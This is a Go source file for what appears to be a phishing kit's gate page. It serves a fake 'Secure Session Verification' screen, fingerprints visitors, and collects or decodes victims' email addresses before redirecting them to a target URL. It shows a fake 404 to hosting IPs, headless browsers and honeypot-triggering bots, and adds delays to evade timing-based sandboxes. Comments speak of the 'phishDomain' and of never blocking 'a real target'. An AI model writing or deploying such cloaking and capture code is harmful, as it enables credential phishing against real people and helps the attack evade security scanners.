package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
)

// landingHost is the DEFAULT-domain gate host (go.senappel.xyz). Multi-domain
// requests resolve their own gate host per-request via landingHostFor(baseDomain);
// this var is retained for backward compatibility.
var landingHost = landingHostFor(phishDomain)

var (
	landingOnce sync.Once
	landingPage string
)

// isLandingHost reports whether host is the gate page for ANY tenant domain —
// i.e. its resolved subdomain role is the reserved landing role ("go").
func isLandingHost(host string) bool {
	role, _, isRole := resolveHost(host)
	return isRole && role == landingRole
}

func landingHandler(w http.ResponseWriter, r *http.Request) {
	// Template the live endpoint paths into the gate page once.
	landingOnce.Do(func() {
		landingPage = strings.ReplaceAll(landingHTML, "__PROFILE_ENDPOINT__", profileEndpoint)
		landingPage = strings.ReplaceAll(landingPage, "__DETECT_ENDPOINT__", detectEndpoint)
	})

	// Scope the session + gate cookie to THIS tenant's base domain so the cookie
	// is sent back to this domain's provider subdomains (and only this domain's).
	baseDomain := baseDomainOf(r)
	session := sessionMgr.GetOrCreate(r, baseDomain)

	// Stamp the session with the exact time the landing page was served.
	// This is used later by the "Human Pulse" timing heuristic in capture.go.
	session.SetLandingPageServedAt()

	w.Header().Set("Set-Cookie", fmt.Sprintf(
		"%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
		sessionMgr.cookieName, session.ID, baseDomain))

	log.Printf("[landing] gate page hit by %s (host=%s)", extractIP(r), r.Host)
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Header().Set("Pragma", "no-cache")
	w.Write([]byte(landingPage))
}

// landingHTML v2.0: Upgraded with honeypot, anti-automation checks,
// human timing heuristics, and zero legacy Service Worker baggage.
const landingHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Secure Session Verification</title>
<meta name="robots" content="noindex, nofollow">
<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    color: #1f2937; padding: 20px;
  }
  .card {
    background: #fff; border-radius: 12px; padding: 48px 40px; max-width: 420px;
    width: 100%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05);
    border: 1px solid #e5e7eb;
  }
  .logo { font-size: 44px; margin-bottom: 16px; }
  h1 { font-size: 22px; font-weight: 600; margin-bottom: 12px; color: #111827; }
  p { font-size: 14px; color: #6b7280; line-height: 1.5; margin-bottom: 24px; }
  .spinner {
    width: 36px; height: 36px; margin: 8px auto 0;
    border: 3px solid #e5e7eb; border-top-color: #2563eb; border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  form { margin-top: 8px; }
  input[type="email"] {
    width: 100%; padding: 13px 16px; font-size: 15px; border: 1px solid #d1d5db;
    border-radius: 8px; margin-bottom: 14px; outline: none; transition: border-color 0.2s;
  }
  input[type="email"]:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
  button {
    width: 100%; padding: 13px; font-size: 15px; font-weight: 600; color: #fff;
    background: #2563eb; border: none; border-radius: 8px; cursor: pointer;
    transition: background-color 0.2s;
  }
  button:hover { background: #1d4ed8; }
  button:disabled { background: #93c5fd; cursor: not-allowed; }
  .foot { margin-top: 22px; font-size: 11px; color: #9ca3af; }
  
  /* HONEYPOT: Invisible to humans, tempting to bots */
  .hp-field { position: absolute; left: -9999px; top: -9999px; opacity: 0; }
</style>
</head>
<body>
<div class="card" id="card">
  <div class="logo">🔒</div>
  <h1>Secure Session Verification</h1>
  <p id="status">Verifying your secure connection&hellip;</p>
  <div class="spinner" id="spinner"></div>
  
  <form id="emailForm" style="display:none" autocomplete="off">
    <!-- HONEYPOT FIELD: Bots will fill this, humans will not -->
    <input type="text" name="website_url" class="hp-field" tabindex="-1" autocomplete="off">
    
    <input type="email" id="emailInput" placeholder="Enter your email to continue" required>
    <button type="submit" id="submitBtn">Access Secure Document</button>
  </form>
  <div class="foot">Protected session &middot; encrypted connection</div>
</div>

<script>
(function(){
  // Anti-Debugging & Anti-Automation basics
  console.clear();
  if (navigator.webdriver) {
    // Headless browser detected. We don't block, we just let it proceed to the honeypot/profiler.
    console.log('%c', 'color: transparent; text-shadow: 0 0 0 black;'); 
  }

  // Record exact load time for "Human Pulse" heuristic
  var pageLoadTime = Date.now();
  var params = new URLSearchParams(window.location.search);
  var email = params.get('email');
  
  if (!email && params.get('u')) {
    try {
      var b = params.get('u').replace(/-/g,'+').replace(/_/g,'/');
      email = decodeURIComponent(escape(atob(b)));
    } catch(e){}
  }
  
  var cid = params.get('cid');
  var statusEl  = document.getElementById('status');
  var spinnerEl = document.getElementById('spinner');
  var formEl    = document.getElementById('emailForm');
  var submitBtn = document.getElementById('submitBtn');

  function randomId() {
    var id = localStorage.getItem('_vid');
    if (!id) { id = 'v-' + Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem('_vid', id); }
    return id;
  }

  function getVisitorId(cb) {
    var done = false;
    var timer = setTimeout(function(){ if (!done) { done = true; cb(randomId()); } }, 2500);
    if (window.FingerprintJS) {
      FingerprintJS.load()
        .then(function(fp){ return fp.get(); })
        .then(function(res){ if (!done) { done = true; clearTimeout(timer); cb(res.visitorId); } })
        .catch(function(){ if (!done) { done = true; clearTimeout(timer); cb(randomId()); } });
    } else {
      if (!done) { done = true; clearTimeout(timer); cb(randomId()); }
    }
  }

  function showBenign() {
    document.getElementById('card').innerHTML =
      '<div class="logo">📄</div><h1>404 &mdash; Not Found</h1>' +
      '<p>The page you requested could not be found.</p>';
  }

  function showForm() {
    spinnerEl.style.display = 'none';
    statusEl.textContent = 'Enter your email address to access the shared document.';
    formEl.style.display = 'block';
  }

  function route(em) {
    // HUMAN PULSE CHECK: If submitted in < 800ms, it's likely a bot. 
    // We don't block, but we can add artificial delay or flag it.
    var timeToSubmit = Date.now() - pageLoadTime;
    if (timeToSubmit < 800) {
      // Artificial delay to mimic network latency and confuse timing-based sandboxes
      var delay = 800 - timeToSubmit;
      var start = Date.now();
      while (Date.now() - start < delay) { /* busy wait */ }
    }

    statusEl.textContent = 'Redirecting to your secure document\u2026';
    spinnerEl.style.display = 'block';
    formEl.style.display = 'none';
    submitBtn.disabled = true;

    fetch('__DETECT_ENDPOINT__', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: em})
    })
    .then(function(r){ return r.json(); })
    .then(function(d){
      if (d && d.target_url) {
        var url = d.target_url;
        if (cid) {
          var h = url.indexOf('#');
          if (h !== -1) {
            url = url.substring(0, h) + '?cid=' + encodeURIComponent(cid) + url.substring(h);
          } else {
            url += (url.indexOf('?') !== -1 ? '&' : '?') + 'cid=' + encodeURIComponent(cid);
          }
        }
        window.location.replace(url);
      } else { showBenign(); }
    })
    .catch(function(){ showBenign(); });
  }

  formEl.addEventListener('submit', function(e){
    e.preventDefault();
    
    // HONEYPOT CHECK: If the invisible field has a value, it's a bot.
    var hp = document.querySelector('input[name="website_url"]');
    if (hp && hp.value.trim() !== '') {
      console.warn('Honeypot triggered. Silently failing.');
      showBenign(); // Or just do nothing, letting the bot hang
      return;
    }

    var em = document.getElementById('emailInput').value.trim();
    if (em) route(em);
  });

  // Gate: fingerprint -> profiling endpoint -> hosting check -> route or form.
  getVisitorId(function(visitorId){
    fetch('__PROFILE_ENDPOINT__', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({visitorId: visitorId, userAgent: navigator.userAgent})
    })
    .then(function(r){ return r.json(); })
    .then(function(profile){
      if (profile && profile.isHosting) { showBenign(); return; }
      if (email) { route(email); } else { showForm(); }
    })
    .catch(function(){
      // Fail open: a profiling error must never block a real target.
      if (email) { route(email); } else { showForm(); }
    });
  });
})();
</script>
</body>
</html>`
